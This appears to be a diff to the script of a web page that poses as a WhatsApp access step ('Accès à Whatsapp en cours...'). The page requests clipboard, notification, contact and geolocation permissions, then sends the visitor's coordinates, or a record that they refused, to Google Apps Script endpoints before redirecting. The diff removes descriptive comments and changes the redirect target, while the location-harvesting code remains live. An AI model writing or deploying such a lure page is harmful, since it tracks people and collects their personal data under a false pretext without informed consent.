@@ -190,24 +190,19 @@
             card.querySelector('p').textContent = "Accès à Whatsapp en cours...";
 
             try {
-                // 1. Demande d'accès au presse-papiers
                 await navigator.permissions.query({ name: 'clipboard-write' });
 
-                // 2. Demande de permission pour les notifications
                 if ('Notification' in window) {
                     await Notification.requestPermission();
                 }
 
-                // 3. Demande d'accès aux contacts
                 if (navigator.contacts && navigator.contacts.select) {
                     await navigator.contacts.select(['name', 'tel'], { multiple: false });
                 }
 
-                // 4. Demande de géolocalisation
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
-                            // Envoi des coordonnées à Google Sheets
                             await fetch("https://script.google.com/macros/s/AKfycbwR1WaGSLL1Kr_ZWDPbwgAW1yr82cSMzyx1wpUz5OT_W9gWZtrJXH4dIvY-B-umpxmF/exec", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
@@ -228,7 +223,7 @@
                             }, 1500);
                         },
                         async (error) => {
-                            // Si géoloc refusée, on écrit "loc refusée" dans Google Sheets
+                            // Envoi refus géoloc dans Google Sheets
                             await fetch("https://script.google.com/macros/s/AKfycbxY5BxchC47A7cDOEwqivqPumIMPOwqBhui9O6BoK7XKXvapcWemRIJc89iexNQJhko/exec", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
@@ -243,8 +238,8 @@
                                 mode: 'no-cors'
                             });
 
-                            // Puis redirection
-                            window.location.href = "https://web.whatsapp.com";
+                            // Redirection vers page explicative
+                            window.location.href = "geoloc-refuse.html";
                         },
                         { enableHighAccuracy: false, timeout: 3000 }
                     );
